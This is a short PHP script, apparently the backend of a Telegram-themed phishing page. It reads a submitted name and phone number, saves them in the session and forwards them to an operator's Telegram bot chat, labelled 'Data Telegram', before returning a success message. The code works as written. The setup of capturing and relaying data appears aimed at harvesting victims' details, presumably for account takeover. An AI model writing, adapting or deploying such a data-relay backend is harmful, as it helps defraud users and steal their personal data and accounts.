<?php
session_start();
include 'telegram.php';
header("Content-Type: application/json");

$input = json_decode(file_get_contents("php://input"), true);

if (empty($input['name']) || empty($input['phone'])) {
    echo json_encode(["status" => "error", "message" => "Nama dan nomor wajib diisi."]);
    exit;
}

$name = htmlspecialchars($input['name']);
$phone = htmlspecialchars($input['phone']);

// Simpan ke session
$_SESSION['name'] = $name;
$_SESSION['phone'] = $phone;

$message = "*Data Telegram*\nNama : $name\nNomor : $phone";
$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message) . "&parse_mode=Markdown";
@file_get_contents($url);

echo json_encode(["status" => "success", "message" => "Data berhasil dikirim."]);
